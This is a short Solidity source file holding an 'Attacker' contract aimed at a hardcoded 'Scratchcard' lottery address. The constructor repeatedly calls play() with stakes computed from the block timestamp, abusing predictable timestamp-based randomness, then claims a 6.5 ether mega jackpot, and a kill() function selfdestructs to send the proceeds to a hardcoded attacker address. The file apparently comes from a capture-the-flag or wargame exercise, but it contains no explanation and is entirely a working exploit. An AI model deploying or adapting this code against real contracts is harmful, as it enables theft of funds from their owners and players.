pragma solidity 0.4.24;
import "./Scratchcard.sol";
// Attacker Address 0x43065950E0185BD74361D8580Daaa5BFF806aaDE
// Scratchcard Address 0x505d51adcccb62cd33579c1ea7b94a717f7ae06e
contract Attacker{

    constructor() public payable {
        Scratchcard target = Scratchcard(0x505d51adcccb62cd33579c1ea7b94a717f7ae06e);
        for(uint i=0;i<25;i++)
            target.play.value((now%10**8)*10**10)();
        target.collectMegaJackpot(6.5 ether);
    }
    
    function () public payable{}
    
    function kill() public payable {
       selfdestruct(address(0x43065950E0185BD74361D8580Daaa5BFF806aaDE));//OWNER 
    }
}
interface I {
    function play() external payable;
    function checkIfMegaJackpotWinner() external returns(bool);
    function collectMegaJackpot(uint256 _amount) external;
    function () external payable;
}